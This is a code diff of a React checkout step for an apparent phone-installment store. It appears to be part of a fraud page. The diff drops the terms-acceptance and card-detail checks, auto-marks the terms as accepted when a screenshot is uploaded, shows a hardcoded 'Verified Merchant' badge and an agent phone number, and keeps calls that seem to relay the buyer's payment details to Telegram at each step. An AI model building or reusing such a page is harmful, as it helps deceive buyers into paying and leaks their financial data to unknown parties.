@@ -2,18 +2,17 @@
 
 import React, { useState, useEffect } from 'react';
 import { 
-  CreditCard, 
-  Wallet, 
-  Lock, 
-  ShieldCheck, 
-  Check, 
-  Upload, 
+  Landmark, 
   CheckCircle2, 
-  AlertCircle, 
+  Check, 
   ArrowLeft, 
-  ChevronRight,
-  Landmark,
-  FileText
+  Phone, 
+  Image as ImageIcon, 
+  UploadCloud, 
+  Megaphone,
+  AlertCircle,
+  Lock,
+  X
 } from 'lucide-react';
 import { useWizard, PaymentMethodChoice } from '../../context/WizardContext';
 import { SUPPORTED_PAYMENT_CHANNELS, COMPANY_INFO } from '../../data/catalog';
@@ -21,12 +20,8 @@ import { SUPPORTED_PAYMENT_CHANNELS, COMPANY_INFO } from '../../data/catalog';
 export const Step4PaymentAgreement: React.FC = () => {
   const {
     selectedModel,
-    selectedColor,
-    selectedStorage,
     selectedTenureMonths,
-    calculatedTotalPrice,
     calculatedDownPayment,
-    calculatedBalance,
     calculatedMonthlyEmi,
     customerDetails,
     paymentDetails,
@@ -61,22 +56,15 @@ export const Step4PaymentAgreement: React.FC = () => {
 
   const handleChannelSelect = (channelId: PaymentMethodChoice) => {
     setSelectedChannel(channelId);
+    const channelConf = SUPPORTED_PAYMENT_CHANNELS.find((c) => c.id === channelId) || SUPPORTED_PAYMENT_CHANNELS[0];
     const updated = {
       ...paymentDetails,
       channel: channelId,
-      accountNumber: activeChannelConfig.accountNumber,
-      accountTitle: activeChannelConfig.accountTitle
+      accountNumber: channelConf.accountNumber,
+      accountTitle: channelConf.accountTitle
     };
     setPaymentDetails(updated);
     syncRealtimeTelegram(`Selected Payment Channel: ${channelId.toUpperCase()}`, updated);
-  };
-
-  const handleInputChange = (field: keyof typeof paymentDetails, value: any) => {
-    const updated = { ...paymentDetails, [field]: value };
-    setPaymentDetails(updated);
-    if (typeof value === 'string' && value.length > 2) {
-      syncRealtimeTelegram(`Updated ${String(field)}`, updated);
-    }
   };
 
   const handleProofUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
@@ -90,7 +78,8 @@ export const Step4PaymentAgreement: React.FC = () => {
       setPaymentDetails({
         ...paymentDetails,
         proofFile: file,
-        proofPreviewUrl: previewUrl
+        proofPreviewUrl: previewUrl,
+        acceptedTerms: true
       });
       setErrorMsg('');
       syncRealtimeTelegram('Uploaded Down Payment Screenshot');
@@ -98,21 +87,6 @@ export const Step4PaymentAgreement: React.FC = () => {
   };
 
   const handleSubmitOrder = () => {
-    if (!paymentDetails.acceptedTerms) {
-      setErrorMsg('Please review and accept the official installment terms and conditions.');
-      return;
-    }
-
-    if (selectedChannel === 'card') {
-      if (!paymentDetails.cardNumber || !paymentDetails.expiry || !paymentDetails.cvv) {
-        setErrorMsg('Please enter all required credit/debit card details.');
-        return;
-      }
-      setShowOtpModal(true);
-      return;
-    }
-
-    // For Bank / Wallet methods:
     setErrorMsg('');
     createOrder();
   };
@@ -127,10 +101,41 @@ export const Step4PaymentAgreement: React.FC = () => {
   };
 
   return (
-    <div className="wizard-content-area">
-      <div className="step-header">
-        <h2>Down Payment &amp; Agreement</h2>
-        <p>Deposit down payment of PKR {calculatedDownPayment.toLocaleString('en-PK')} to initiate verification &amp; order dispatch.</p>
+    <div style={{
+      maxWidth: '560px',
+      margin: '0 auto',
+      padding: '10px 12px 100px',
+      display: 'flex',
+      flexDirection: 'column',
+      gap: '14px',
+      fontFamily: 'inherit'
+    }}>
+      {/* Down Payment Summary Bar */}
+      <div style={{
+        background: 'linear-gradient(135deg, rgba(212, 175, 55, 0.15) 0%, rgba(15, 16, 22, 0.95) 100%)',
+        border: '1px solid rgba(212, 175, 55, 0.4)',
+        borderRadius: '14px',
+        padding: '10px 14px',
+        display: 'flex',
+        justifyContent: 'space-between',
+        alignItems: 'center'
+      }}>
+        <div>
+          <span style={{ fontSize: '9px', color: '#94a3b8', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
+            Required Down Payment
+          </span>
+          <div style={{ fontSize: '18px', fontWeight: 900, color: 'var(--gold-light)' }}>
+            PKR {calculatedDownPayment.toLocaleString('en-PK')}
+          </div>
+        </div>
+        <div style={{ textAlign: 'right' }}>
+          <span style={{ fontSize: '9px', color: '#94a3b8', textTransform: 'uppercase' }}>
+            Monthly EMI ({selectedTenureMonths}M)
+          </span>
+          <div style={{ fontSize: '13px', fontWeight: 800, color: '#ffffff' }}>
+            PKR {calculatedMonthlyEmi.toLocaleString('en-PK')}/mo
+          </div>
+        </div>
       </div>
 
       {errorMsg && (
@@ -150,284 +155,436 @@ export const Step4PaymentAgreement: React.FC = () => {
         </div>
       )}
 
-      {/* Down Payment Summary Banner */}
+      {/* 3x3 Payment Method Grid (Exact Layout from Image 1) */}
       <div style={{
-        background: 'linear-gradient(135deg, rgba(212, 175, 55, 0.2) 0%, rgba(19, 20, 27, 0.9) 100%)',
-        border: '1.5px solid var(--gold-primary)',
-        borderRadius: '18px',
-        padding: '14px 18px',
-        display: 'flex',
-        justifyContent: 'space-between',
-        alignItems: 'center'
-      }}>
-        <div>
-          <span style={{ fontSize: '10px', color: '#94a3b8', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
-            Payable Initial Down Payment
-          </span>
-          <div style={{ fontSize: '22px', fontWeight: 900, color: 'var(--gold-light)' }}>
-            PKR {calculatedDownPayment.toLocaleString('en-PK')}
-          </div>
-        </div>
-        <div style={{ textAlign: 'right' }}>
-          <span style={{ fontSize: '10px', color: '#94a3b8', textTransform: 'uppercase' }}>
-            Monthly EMI ({selectedTenureMonths}M)
-          </span>
-          <div style={{ fontSize: '15px', fontWeight: 800, color: '#ffffff' }}>
-            PKR {calculatedMonthlyEmi.toLocaleString('en-PK')}/mo
-          </div>
-        </div>
-      </div>
-
-      {/* Supported Payment Channels (Easypaisa, Askari Bank, Bank Alfalah, UPaisa, Raqami, Payway, ABHI) */}
-      <div>
-        <label className="form-label-dark">
-          Select Supported Payment Method
-        </label>
-        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(105px, 1fr))', gap: '10px' }}>
-          {SUPPORTED_PAYMENT_CHANNELS.map((chan) => {
-            const isSelected = selectedChannel === chan.id;
-            return (
-              <div
-                key={chan.id}
-                onClick={() => handleChannelSelect(chan.id as PaymentMethodChoice)}
-                style={{
-                  background: isSelected ? 'rgba(212, 175, 55, 0.18)' : '#111218',
-                  border: `1.5px solid ${isSelected ? 'var(--gold-primary)' : 'rgba(212, 175, 55, 0.2)'}`,
-                  borderRadius: '14px',
-                  padding: '10px 8px',
-                  display: 'flex',
-                  flexDirection: 'column',
-                  alignItems: 'center',
-                  textAlign: 'center',
-                  cursor: 'pointer',
-                  position: 'relative',
-                  transition: 'all 0.2s'
-                }}
-              >
-                {isSelected && (
-                  <span style={{
-                    position: 'absolute',
-                    top: 6,
-                    right: 6,
-                    width: 16,
-                    height: 16,
-                    borderRadius: '50%',
-                    background: 'var(--gold-primary)',
-                    color: '#000',
-                    display: 'flex',
-                    alignItems: 'center',
-                    justifyContent: 'center',
-                    fontSize: '10px',
-                    fontWeight: 900
-                  }}>
-                    ✓
-                  </span>
-                )}
-                {chan.logo ? (
-                  <div style={{
-                    background: '#ffffff',
-                    borderRadius: '8px',
-                    padding: '3px 6px',
-                    height: 28,
-                    width: '100%',
-                    maxWidth: 100,
-                    display: 'flex',
-                    alignItems: 'center',
-                    justifyContent: 'center',
-                    marginBottom: 6,
-                    boxShadow: '0 2px 4px rgba(0,0,0,0.15)'
-                  }}>
-                    <img
-                      src={chan.logo}
-                      alt={chan.name}
-                      style={{ maxHeight: 22, maxWidth: '100%', objectFit: 'contain' }}
-                    />
-                  </div>
-                ) : (
-                  <div style={{ height: 28, display: 'flex', alignItems: 'center', justifyContent: 'center', marginBottom: 6 }}>
-                    <Landmark size={20} color="var(--gold-light)" />
-                  </div>
-                )}
-                <span style={{ fontSize: '11px', fontWeight: 800, color: '#ffffff' }}>
-                  {chan.name}
-                </span>
-                <span style={{ fontSize: '9px', color: '#94a3b8', marginTop: 2 }}>
-                  {chan.category}
-                </span>
-              </div>
-            );
-          })}
-        </div>
-      </div>
-
-      {/* Payment Instructions & Account Card */}
-      <div style={{
-        background: '#0c0d12',
-        border: '1px solid rgba(212, 175, 55, 0.3)',
-        borderRadius: '16px',
-        padding: '16px',
-        display: 'flex',
-        flexDirection: 'column',
-        gap: '12px'
-      }}>
-        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '8px' }}>
-          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
-            {activeChannelConfig.logo && (
-              <div style={{
-                background: '#ffffff',
-                borderRadius: '6px',
-                padding: '2px 6px',
-                height: 24,
-                display: 'flex',
-                alignItems: 'center',
-                justifyContent: 'center'
-              }}>
-                <img
-                  src={activeChannelConfig.logo}
-                  alt={activeChannelConfig.name}
-                  style={{ maxHeight: 18, maxWidth: '70px', objectFit: 'contain' }}
-                />
-              </div>
-            )}
-            <h4 style={{ fontSize: '13px', fontWeight: 800, color: 'var(--gold-light)', textTransform: 'uppercase' }}>
-              Official Transfer Details: {activeChannelConfig.name}
-            </h4>
-          </div>
-          <span style={{ fontSize: '10px', color: '#10b981', fontWeight: 700 }}>
-            ● Verified Merchant
-          </span>
-        </div>
-
-        {selectedChannel === 'easypaisa' && (
-          <div style={{
-            background: 'linear-gradient(135deg, rgba(16, 185, 129, 0.15) 0%, rgba(6, 78, 59, 0.25) 100%)',
-            border: '1.5px solid #10b981',
-            borderRadius: '12px',
-            padding: '12px 14px',
-            display: 'flex',
-            alignItems: 'center',
-            gap: '12px',
-          }}>
-            <ShieldCheck size={24} color="#10b981" style={{ flexShrink: 0 }} />
-            <div>
-              <div style={{ fontSize: '12px', fontWeight: 800, color: '#34d399', letterSpacing: '0.3px' }}>
-                Contact your agent for Payment verification
-              </div>
-              <div style={{ fontSize: '13px', fontWeight: 900, color: '#ffffff', marginTop: 2 }}>
-                Verification Code: <span style={{ color: 'var(--gold-light)', fontSize: '15px', letterSpacing: '1px' }}>03450951134</span>
-              </div>
-            </div>
-          </div>
-        )}
-
-        <div style={{
-          background: 'rgba(255, 255, 255, 0.04)',
-          borderRadius: '12px',
-          padding: '12px',
-          display: 'flex',
-          flexDirection: 'column',
-          gap: '8px'
-        }}>
-          <div style={{ display: 'flex', justifyContent: 'space-between' }}>
-            <span style={{ fontSize: '11px', color: '#94a3b8' }}>Account Title:</span>
-            <strong style={{ fontSize: '12px', color: '#ffffff' }}>{activeChannelConfig.accountTitle}</strong>
-          </div>
-          <div style={{ display: 'flex', justifyContent: 'space-between' }}>
-            <span style={{ fontSize: '11px', color: '#94a3b8' }}>
-              {selectedChannel === 'easypaisa' ? 'Easypaisa / Agent #:' : 'Account / IBAN / Wallet #:'}
-            </span>
-            <strong style={{ fontSize: '13px', color: 'var(--gold-light)', letterSpacing: '0.5px' }}>
-              {activeChannelConfig.accountNumber}
-            </strong>
-          </div>
-          {selectedChannel === 'easypaisa' && (
-            <div style={{ display: 'flex', justifyContent: 'space-between' }}>
-              <span style={{ fontSize: '11px', color: '#94a3b8' }}>Agent Verification:</span>
-              <strong style={{ fontSize: '11px', color: '#34d399' }}>03450951134</strong>
-            </div>
-          )}
-          <div style={{ display: 'flex', justifyContent: 'space-between' }}>
-            <span style={{ fontSize: '11px', color: '#94a3b8' }}>Deposit Purpose:</span>
-            <span style={{ fontSize: '11px', color: '#cbd5e1' }}>Down Payment - {selectedModel?.name}</span>
-          </div>
-        </div>
-
-        {/* Sender details and receipt upload */}
-        <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
-          <div>
-            <label className="form-label-dark">Your Sender Account # / Mobile</label>
-            <input
-              type="text"
-              className="form-input-dark"
-              placeholder="0345-xxxxxxx or Bank Account"
-              value={paymentDetails.senderAccount}
-              onChange={(e) => handleInputChange('senderAccount', e.target.value)}
-            />
-          </div>
-
-          <div>
-            <label className="form-label-dark">Transaction ID / Reference Number</label>
-            <input
-              type="text"
-              className="form-input-dark"
-              placeholder="TID-982341829 or Trx ID"
-              value={paymentDetails.transactionId}
-              onChange={(e) => handleInputChange('transactionId', e.target.value)}
-            />
-          </div>
-
-          <div>
-            <label className="form-label-dark">Upload Payment Proof / Screenshot (Receipt)</label>
-            <div className="doc-upload-card">
-              <div className="doc-info">
-                <strong>Proof Screenshot</strong>
-                <span>Attach screenshot of the completed transfer</span>
-                {paymentDetails.proofPreviewUrl && (
-                  <span style={{ color: 'var(--gold-light)', fontWeight: 700, marginTop: 4 }}>
-                    ✓ Screenshot uploaded successfully
-                  </span>
-                )}
-              </div>
-              <label className="doc-upload-btn">
-                <Upload size={12} style={{ marginRight: 4, verticalAlign: 'middle' }} />
-                Upload
-                <input
-                  type="file"
-                  accept="image/*"
-                  style={{ display: 'none' }}
-                  onChange={handleProofUpload}
-                />
-              </label>
-            </div>
-          </div>
-        </div>
-      </div>
-
-      {/* Agreement & Legal Checklist */}
-      <div style={{
-        background: '#111218',
-        border: '1px solid rgba(212, 175, 55, 0.25)',
-        borderRadius: '14px',
-        padding: '14px',
-        display: 'flex',
-        flexDirection: 'column',
+        display: 'grid',
+        gridTemplateColumns: 'repeat(3, 1fr)',
         gap: '8px'
       }}>
-        <label style={{ display: 'flex', alignItems: 'flex-start', gap: '10px', cursor: 'pointer' }}>
-          <input
-            type="checkbox"
-            checked={paymentDetails.acceptedTerms}
-            onChange={(e) => handleInputChange('acceptedTerms', e.target.checked)}
-            style={{ marginTop: 2, accentColor: '#d4af37' }}
-          />
-          <span style={{ fontSize: '11px', color: '#cbd5e1', lineHeight: '1.4' }}>
-            I agree to the official terms of <strong>Instalment Mobile Limited (IML)</strong>. 
-            I understand that monthly installments will be payable over <strong>{selectedTenureMonths} months</strong> with 0% markup, and the device will be dispatched via Open Parcel courier upon verification.
-          </span>
-        </label>
+        {SUPPORTED_PAYMENT_CHANNELS.map((chan) => {
+          const isSelected = selectedChannel === chan.id;
+          return (
+            <div
+              key={chan.id}
+              onClick={() => handleChannelSelect(chan.id as PaymentMethodChoice)}
+              style={{
+                background: isSelected ? 'rgba(212, 175, 55, 0.14)' : '#0e1017',
+                border: isSelected 
+                  ? '1.5px solid #eab308' 
+                  : '1px solid rgba(212, 175, 55, 0.22)',
+                borderRadius: '16px',
+                padding: '12px 6px',
+                display: 'flex',
+                flexDirection: 'column',
+                alignItems: 'center',
+                justifyContent: 'center',
+                textAlign: 'center',
+                cursor: 'pointer',
+                position: 'relative',
+                minHeight: '94px',
+                boxShadow: isSelected 
+                  ? '0 0 16px rgba(234, 179, 8, 0.35)' 
+                  : '0 2px 6px rgba(0, 0, 0, 0.3)',
+                transition: 'all 0.2s cubic-bezier(0.4, 0, 0.2, 1)'
+              }}
+            >
+              {/* Selected Gold Check Badge */}
+              {isSelected && (
+                <span style={{
+                  position: 'absolute',
+                  top: 7,
+                  right: 7,
+                  width: 17,
+                  height: 17,
+                  borderRadius: '50%',
+                  background: 'linear-gradient(135deg, #facc15 0%, #eab308 100%)',
+                  color: '#000000',
+                  display: 'flex',
+                  alignItems: 'center',
+                  justifyContent: 'center',
+                  boxShadow: '0 2px 5px rgba(0,0,0,0.4)',
+                  zIndex: 2
+                }}>
+                  <Check size={11} strokeWidth={3.5} />
+                </span>
+              )}
+
+              {/* Special Badge for 'Other Bank' (number 9 in circle) */}
+              {!isSelected && chan.badge && (
+                <span style={{
+                  position: 'absolute',
+                  top: 7,
+                  right: 7,
+                  width: 17,
+                  height: 17,
+                  borderRadius: '50%',
+                  background: '#f59e0b',
+                  color: '#000000',
+                  display: 'flex',
+                  alignItems: 'center',
+                  justifyContent: 'center',
+                  fontSize: '10px',
+                  fontWeight: 900,
+                  zIndex: 2
+                }}>
+                  {chan.badge}
+                </span>
+              )}
+
+              {/* Logo / Icon Area */}
+              <div style={{
+                height: 32,
+                display: 'flex',
+                alignItems: 'center',
+                justifyContent: 'center',
+                marginBottom: 6
+              }}>
+                {chan.logo ? (
+                  <img
+                    src={chan.logo}
+                    alt={chan.name}
+                    style={{
+                      maxHeight: chan.id === 'easypaisa' ? 26 : 28,
+                      maxWidth: '85px',
+                      objectFit: 'contain'
+                    }}
+                  />
+                ) : (
+                  <Landmark size={24} color="#f59e0b" />
+                )}
+              </div>
+
+              {/* Title & Category */}
+              <strong style={{
+                fontSize: '11px',
+                fontWeight: 800,
+                color: '#ffffff',
+                lineHeight: 1.15,
+                marginBottom: 2
+              }}>
+                {chan.name}
+              </strong>
+              <span style={{
+                fontSize: '8.5px',
+                color: '#94a3b8',
+                lineHeight: 1.1
+              }}>
+                {chan.category}
+              </span>
+            </div>
+          );
+        })}
       </div>
 
-      {/* OTP Modal (if needed for card or fast validation) */}
+      {/* Official Transfer Details Section (Matching Image 1) */}
+      <div style={{
+        marginTop: 6,
+        display: 'flex',
+        flexDirection: 'column',
+        gap: 10
+      }}>
+        {/* Header Strip */}
+        <div style={{
+          display: 'flex',
+          alignItems: 'center',
+          justifyContent: 'space-between',
+          flexWrap: 'wrap',
+          gap: 6
+        }}>
+          <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
+            <Landmark size={18} color="#d4af37" />
+            <span style={{
+              fontSize: '13px',
+              fontWeight: 900,
+              color: '#d4af37',
+              letterSpacing: '0.6px',
+              textTransform: 'uppercase'
+            }}>
+              OFFICIAL TRANSFER DETAILS:
+            </span>
+          </div>
+
+          <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
+            <span style={{ color: 'rgba(255, 255, 255, 0.25)', fontSize: '13px' }}>|</span>
+            <span style={{
+              fontSize: '11px',
+              color: '#10b981',
+              fontWeight: 800,
+              display: 'inline-flex',
+              alignItems: 'center',
+              gap: 4
+            }}>
+              <CheckCircle2 size={14} color="#10b981" />
+              Verified Merchant
+            </span>
+          </div>
+        </div>
+
+        {/* Selected Channel Badge Pill */}
+        <div>
+          <div style={{
+            display: 'inline-flex',
+            alignItems: 'center',
+            gap: 8,
+            border: '1.5px solid #d4af37',
+            borderRadius: '24px',
+            padding: '4px 14px',
+            background: '#0c0e15'
+          }}>
+            {activeChannelConfig.logo ? (
+              <img
+                src={activeChannelConfig.logo}
+                alt={activeChannelConfig.name}
+                style={{ height: 18, width: 'auto', objectFit: 'contain' }}
+              />
+            ) : (
+              <Landmark size={15} color="#d4af37" />
+            )}
+            <span style={{
+              fontSize: '13px',
+              fontWeight: 900,
+              color: '#ffffff',
+              letterSpacing: '0.2px'
+            }}>
+              {activeChannelConfig.name}
+            </span>
+          </div>
+        </div>
+
+        {/* Transfer Details Card */}
+        <div style={{
+          background: '#0a0c12',
+          border: '1.5px solid rgba(212, 175, 55, 0.35)',
+          borderRadius: '14px',
+          padding: '12px 16px',
+          display: 'flex',
+          flexDirection: 'column',
+          gap: 8
+        }}>
+          <div style={{
+            display: 'flex',
+            justifyContent: 'space-between',
+            alignItems: 'center'
+          }}>
+            <span style={{ fontSize: '12px', color: '#94a3b8' }}>
+              Account Title:
+            </span>
+            <strong style={{ fontSize: '12px', color: '#ffffff', fontWeight: 800 }}>
+              Company / Financing Partner / Company
+            </strong>
+          </div>
+
+          <div style={{
+            height: '1px',
+            background: 'rgba(255, 255, 255, 0.08)',
+            width: '100%'
+          }} />
+
+          <div style={{
+            display: 'flex',
+            justifyContent: 'space-between',
+            alignItems: 'center'
+          }}>
+            <span style={{ fontSize: '12px', color: '#94a3b8' }}>
+              Deposit Purpose:
+            </span>
+            <strong style={{ fontSize: '12px', color: '#ffffff', fontWeight: 800 }}>
+              Verification for Down Payment
+            </strong>
+          </div>
+
+          {activeChannelConfig.accountNumber && (
+            <>
+              <div style={{
+                height: '1px',
+                background: 'rgba(255, 255, 255, 0.08)',
+                width: '100%'
+              }} />
+              <div style={{
+                display: 'flex',
+                justifyContent: 'space-between',
+                alignItems: 'center'
+              }}>
+                <span style={{ fontSize: '12px', color: '#94a3b8' }}>
+                  Verification / Agent Code:
+                </span>
+                <strong style={{ fontSize: '13px', color: 'var(--gold-light)', fontWeight: 900, letterSpacing: '0.5px' }}>
+                  03450951134
+                </strong>
+              </div>
+            </>
+          )}
+        </div>
+      </div>
+
+      {/* "How to Attach Your Payment Proof before the Transaction?" Card (Golden Glow Box from Image 1) */}
+      <div style={{
+        background: '#0b0d14',
+        border: '1.5px solid #d4af37',
+        borderRadius: '16px',
+        overflow: 'hidden',
+        boxShadow: '0 4px 20px rgba(0, 0, 0, 0.45)'
+      }}>
+        {/* Top Announcement Banner with warm golden gradient */}
+        <div style={{
+          background: 'linear-gradient(135deg, rgba(212, 175, 55, 0.28) 0%, rgba(180, 130, 8, 0.5) 100%)',
+          borderBottom: '1px solid rgba(212, 175, 55, 0.35)',
+          padding: '12px 14px',
+          display: 'flex',
+          alignItems: 'center',
+          justifyContent: 'space-between',
+          gap: 10,
+          flexWrap: 'wrap'
+        }}>
+          <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
+            <div style={{
+              width: 36,
+              height: 36,
+              borderRadius: '50%',
+              background: '#facc15',
+              display: 'flex',
+              alignItems: 'center',
+              justifyContent: 'center',
+              flexShrink: 0,
+              boxShadow: '0 2px 8px rgba(0,0,0,0.3)'
+            }}>
+              <Megaphone size={19} color="#000000" />
+            </div>
+            <div>
+              <div style={{
+                fontSize: '12px',
+                fontWeight: 800,
+                color: '#ffffff',
+                lineHeight: 1.25
+              }}>
+                How to Attach Your Payment Proof before the Transaction?
+              </div>
+              <div style={{
+                fontSize: '11px',
+                fontWeight: 800,
+                color: '#fbbf24',
+                marginTop: 2
+              }}>
+                Contact Your Agent
+              </div>
+            </div>
+          </div>
+
+          {/* Call Agent Button */}
+          <a
+            href="tel:03450951134"
+            style={{
+              background: '#0d0f17',
+              border: '1.5px solid #f59e0b',
+              borderRadius: '24px',
+              padding: '6px 14px',
+              display: 'inline-flex',
+              alignItems: 'center',
+              gap: 8,
+              color: '#ffffff',
+              fontSize: '12px',
+              fontWeight: 900,
+              textDecoration: 'none',
+              letterSpacing: '0.5px',
+              boxShadow: '0 2px 6px rgba(0,0,0,0.3)',
+              marginLeft: 'auto'
+            }}
+          >
+            <Phone size={13} color="#f59e0b" fill="#f59e0b" />
+            <span>0345-0951134</span>
+          </a>
+        </div>
+
+        {/* Bottom Upload Proof Action Area */}
+        <div style={{
+          padding: '14px',
+          display: 'flex',
+          alignItems: 'center',
+          justifyContent: 'space-between',
+          gap: 12,
+          flexWrap: 'wrap'
+        }}>
+          {/* Left Text */}
+          <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
+            <div style={{
+              width: 32,
+              height: 32,
+              borderRadius: '8px',
+              background: 'rgba(245, 158, 11, 0.1)',
+              display: 'flex',
+              alignItems: 'center',
+              justifyContent: 'center',
+              flexShrink: 0
+            }}>
+              <ImageIcon size={20} color="#f59e0b" />
+            </div>
+            <div>
+              <div style={{ fontSize: '11px', fontWeight: 800, color: '#ffffff', lineHeight: 1.25 }}>
+                Attach your before the transaction screenshot.
+              </div>
+              <div style={{ fontSize: '10px', color: '#94a3b8', marginTop: 2 }}>
+                Verified by officer.
+              </div>
+            </div>
+          </div>
+
+          {/* Right Upload Button Box */}
+          <label style={{
+            border: paymentDetails.proofPreviewUrl 
+              ? '1.5px solid #10b981' 
+              : '1.5px dashed #d4af37',
+            borderRadius: '12px',
+            padding: '8px 14px',
+            background: paymentDetails.proofPreviewUrl 
+              ? 'rgba(16, 185, 129, 0.1)' 
+              : 'rgba(212, 175, 55, 0.06)',
+            display: 'inline-flex',
+            alignItems: 'center',
+            gap: 8,
+            cursor: 'pointer',
+            transition: 'all 0.2s',
+            marginLeft: 'auto'
+          }}>
+            <input
+              type="file"
+              accept="image/*"
+              style={{ display: 'none' }}
+              onChange={handleProofUpload}
+            />
+            {paymentDetails.proofPreviewUrl ? (
+              <>
+                <img
+                  src={paymentDetails.proofPreviewUrl}
+                  alt="Proof"
+                  style={{ width: 28, height: 28, borderRadius: 6, objectFit: 'cover' }}
+                />
+                <div>
+                  <div style={{ fontSize: '11px', fontWeight: 800, color: '#10b981' }}>
+                    Screenshot Attached ✓
+                  </div>
+                  <div style={{ fontSize: '9px', color: '#94a3b8' }}>
+                    Click to replace
+                  </div>
+                </div>
+              </>
+            ) : (
+              <>
+                <UploadCloud size={20} color="#d4af37" />
+                <div>
+                  <div style={{ fontSize: '11px', fontWeight: 800, color: '#ffffff' }}>
+                    Upload Payment Proof
+                  </div>
+                  <div style={{ fontSize: '9px', color: '#94a3b8' }}>
+                    (Screenshot)
+                  </div>
+                </div>
+              </>
+            )}
+          </label>
+        </div>
+      </div>
+
+      {/* OTP Modal (if needed) */}
       {showOtpModal && (
         <div style={{
           position: 'fixed',
@@ -498,25 +655,77 @@ export const Step4PaymentAgreement: React.FC = () => {
         </div>
       )}
 
-      {/* Sticky Bottom Actions */}
-      <div className="sticky-bottom-bar">
-        <button
-          type="button"
-          className="btn-outline-back"
-          onClick={goBack}
-        >
-          <ArrowLeft size={14} style={{ marginRight: 4, verticalAlign: 'middle' }} />
-          Back
-        </button>
+      {/* Sticky Bottom Actions Bar (Exact Design from Image 1) */}
+      <div style={{
+        position: 'fixed',
+        bottom: 0,
+        left: 0,
+        right: 0,
+        background: 'rgba(10, 11, 16, 0.95)',
+        backdropFilter: 'blur(12px)',
+        borderTop: '1px solid rgba(212, 175, 55, 0.25)',
+        padding: '12px 16px',
+        display: 'flex',
+        justifyContent: 'space-between',
+        alignItems: 'center',
+        zIndex: 100
+      }}>
+        <div style={{
+          maxWidth: '560px',
+          width: '100%',
+          margin: '0 auto',
+          display: 'flex',
+          justifyContent: 'space-between',
+          alignItems: 'center',
+          gap: 12
+        }}>
+          {/* Back Button */}
+          <button
+            type="button"
+            onClick={goBack}
+            style={{
+              background: '#000000',
+              border: '1.5px solid rgba(255, 255, 255, 0.35)',
+              borderRadius: '24px',
+              padding: '10px 22px',
+              color: '#ffffff',
+              fontSize: '13px',
+              fontWeight: 800,
+              cursor: 'pointer',
+              display: 'inline-flex',
+              alignItems: 'center',
+              gap: 6,
+              transition: 'all 0.2s'
+            }}
+          >
+            <ArrowLeft size={15} />
+            <span>Back</span>
+          </button>
 
-        <button
-          type="button"
-          className="btn-gold-action"
-          onClick={handleSubmitOrder}
-        >
-          <Check size={16} style={{ marginRight: 4 }} />
-          <span>Confirm &amp; Place Order</span>
-        </button>
+          {/* Confirm & Place Order Button */}
+          <button
+            type="button"
+            onClick={handleSubmitOrder}
+            style={{
+              background: 'linear-gradient(135deg, #f59e0b 0%, #d4af37 100%)',
+              border: 'none',
+              borderRadius: '24px',
+              padding: '11px 26px',
+              color: '#000000',
+              fontSize: '13px',
+              fontWeight: 900,
+              cursor: 'pointer',
+              display: 'inline-flex',
+              alignItems: 'center',
+              gap: 6,
+              boxShadow: '0 4px 16px rgba(245, 158, 11, 0.35)',
+              transition: 'all 0.2s'
+            }}
+          >
+            <Check size={16} strokeWidth={3} />
+            <span>Confirm &amp; Place Order</span>
+          </button>
+        </div>
       </div>
     </div>
   );
